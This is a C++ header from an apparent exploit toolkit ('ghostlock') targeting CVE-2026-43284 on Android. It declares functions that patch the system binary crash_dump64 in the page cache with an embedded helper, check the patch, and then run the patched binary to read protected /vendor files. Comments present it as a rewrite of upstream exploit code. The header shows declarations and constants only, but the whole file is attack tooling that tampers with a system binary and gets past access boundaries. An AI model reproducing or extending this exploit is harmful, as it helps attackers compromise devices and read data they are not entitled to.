#ifndef GHOSTLOCK_BACKEND_CVE_2026_43284_STEPS_CRASH_DUMP_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43284_STEPS_CRASH_DUMP_HPP

/* CVE-2026-43284 patch #1 and the crash_dump domain read bridge (B5-6 endgame).
 *
 * Independent rewrite of the upstream functionality in
 * third_party/dirtyfrag/usermode/ankit/exp.c:
 *   - patch_ko() patch #1: pad16(splicehelper) -> crash_dump64+0, then verify
 *     the 16-byte window at offset 16 (exp.c:612-648);
 *   - read_vendor_content(): exec the already-patched crash_dump64 in splice
 *     mode with argv {offset, path} and read the 16-byte page back from its
 *     stdout (exp.c:157-208).
 *
 * Both halves are expressed over injected surfaces so nothing here touches a
 * device: the patch write is a contract::FileCacheWriteOps (typically the
 * page-cache primitive bound to the crash_dump64 fd) and the bridge read is a
 * function pointer. real_crash_dump_bridge() is the Android/Linux binding; on
 * any other host it is an unavailable surface and the host tests inject a fake.
 *
 * ADR-0004 R1: backend submodule header, no pipeline/ include. */

#include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
#include "contract/capabilities.hpp"

#include <cstddef>
#include <cstdint>
#include <string_view>

namespace ghostlock::backend::cve_2026_43284::steps {

    /* exp.c kCrashDump. */
    inline constexpr char kCrashDump64Path[] =
            "/apex/com.android.runtime/bin/crash_dump64";

    /* One page-cache block; patch #1 writes the helper in these units. */
    inline constexpr std::size_t kCrashDumpBlockBytes = 16U;
    /* exp.c verifies the 16-byte window at this offset after patch #1. */
    inline constexpr std::uint64_t kCrashDumpVerifyOffset = 16U;

    /* The embedded helper, already padded to the page-cache block size. The
     * bytes point at static storage owned by the embedding translation unit. */
    struct SpliceHelperPlan final {
        const std::uint8_t *raw = nullptr;
        std::size_t raw_size = 0U;
        const std::uint8_t *padded = nullptr; /* == raw; size rounded up */
        std::size_t padded_size = 0U;
        const char *sha256 = nullptr;
    };

    /* Returns the static plan of the embedded upstream splicehelper. */
    [[nodiscard]] SpliceHelperPlan splice_helper_plan() noexcept;

    /* Injected surface for patch #1. write is bound to the crash_dump64 target
     * (the page-cache primitive); read16 is a plain pread used only for the
     * offset-16 verify. A missing read16 skips the verify, exactly like the
     * upstream "verify skipped: cannot read crash_dump64" branch. */
    struct CrashDumpPatchOps final {
        contract::FileCacheWriteOps write{};
        long (*read16)(void *ctx, std::uint64_t offset,
                       std::uint8_t out[16]) noexcept = nullptr;

        [[nodiscard]] bool write_ready() const noexcept {
            return write.write16 != nullptr;
        }
    };

    enum class CrashDumpPatchError : std::uint8_t {
        None = 0,
        NotAvailable,
        WriteFailed,
        VerifyMismatch,
    };

    /* Writes swap(padded helper) at offset 0, block by block, then verifies the
     * 16-byte window at offset 16 when read16 is bound. A full read that differs
     * is VerifyMismatch; a short read is treated as "verify skipped" (upstream
     * exp.c:636-647). */
    [[nodiscard]] CrashDumpPatchError patch_crash_dump(
            const CrashDumpPatchOps &ops) noexcept;

    /* ---- crash_dump domain read bridge (vendor files) ---- */

    /* Reads one 16-byte block of path through the already-patched crash_dump64.
     * Returns 16 on success, or a negative -errno. */
    struct CrashDumpBridgeOps final {
        void *ctx = nullptr;
        long (*read16)(void *ctx, std::string_view path, std::uint64_t offset,
                       std::uint8_t out[16]) noexcept = nullptr;
        /* Exec the already-patched helper with argv {offset, path} and its
         * stdout bound to pipe_write_fd, so the helper splice(2)s the vendor
         * page into the writer's pipe (exp.c do_one_write_cbc use_helper=1).
         * Returns 16 on success, or a negative -errno. */
        long (*splice16_into_pipe)(void *ctx, std::string_view path,
                                   std::uint64_t offset,
                                   int pipe_write_fd) noexcept = nullptr;

        [[nodiscard]] bool available() const noexcept {
            return read16 != nullptr && splice16_into_pipe != nullptr;
        }
    };

    /* Android/Linux binding: pipe + fork/execv the patched crash_dump64 with
     * argv {offset, path} and read the spliced 16-byte page from stdout. On any
     * other host the returned surface is unavailable. */
    [[nodiscard]] CrashDumpBridgeOps real_crash_dump_bridge() noexcept;

    /* True for paths the production carrier policy treats as vendor files
     * (/vendor/... or /system/vendor/...). */
    [[nodiscard]] bool is_vendor_path(std::string_view path) noexcept;

} // namespace ghostlock::backend::cve_2026_43284::steps

#endif
